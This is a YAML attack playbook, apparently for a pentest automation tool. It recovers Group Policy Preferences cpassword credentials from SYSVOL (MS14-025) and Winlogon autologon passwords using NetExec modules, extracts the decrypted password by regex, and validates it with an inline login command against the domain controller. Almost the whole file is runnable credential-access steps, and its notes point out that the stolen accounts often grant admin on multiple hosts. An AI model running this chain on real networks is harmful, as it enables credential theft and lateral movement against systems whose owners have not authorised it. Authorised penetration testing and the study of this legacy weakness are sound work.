id: gpp-cpassword-recovery
name: "Cred Access — GPP cpassword recovery (MS14-025)"
description: >
  Pre-MS14-025 Group Policy Preferences stored encrypted passwords in
  SYSVOL with the AES key Microsoft accidentally published. Any authenticated
  user can read those XML files. Still a freebie on legacy AD networks.
tags: [credential-access, gpp, sysvol, group-policy, classic-windows]
difficulty: easy

inputs:
  - name: dc_ip
    source: target_context.ip
    required: true
  - name: user
    source: target_context.user
    required: true
  - name: password
    source: target_context.password

steps:
  - id: search_gpp
    name: "Grep SYSVOL for cpassword XML"
    command_ref: nxc-smb-gpp-password
    inputs:
      ip: "${dc_ip}"
      user: "${user}"
      password: "${password}"
    capture:
      - var: gpp_cred
        regex: '(?:Found credentials|Decrypted password)[:\s]+(.+)'
        match: first

  - id: also_autologin
    name: "Check Registry-stored autologon creds (winlogon)"
    command_ref: nxc-smb-gpp-autologin
    inputs:
      ip: "${dc_ip}"
      user: "${user}"
      password: "${password}"
    notes: |
      Some Windows servers store DefaultPassword in HKLM\Software\Microsoft\
      Windows NT\CurrentVersion\Winlogon. Still common on kiosks / RDP
      jumpboxes.

  - id: validate
    name: "Validate the recovered credential"
    inline_command: "nxc smb <ip> -u '<user>' -p '<found_pwd>'"
    requires: [gpp_cred]
    inputs:
      ip: "${dc_ip}"
    notes: |
      GPP creds frequently belong to legacy admin accounts or scheduled-task
      service users — usually Pwn3d! on multiple boxes.

references:
  - title: "MS14-025 GPP password disclosure"
    url:   "https://msrc.microsoft.com/update-guide/en-US/advisory/MS14-025"
  - title: "HackTricks — GPP"
    url:   "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html"
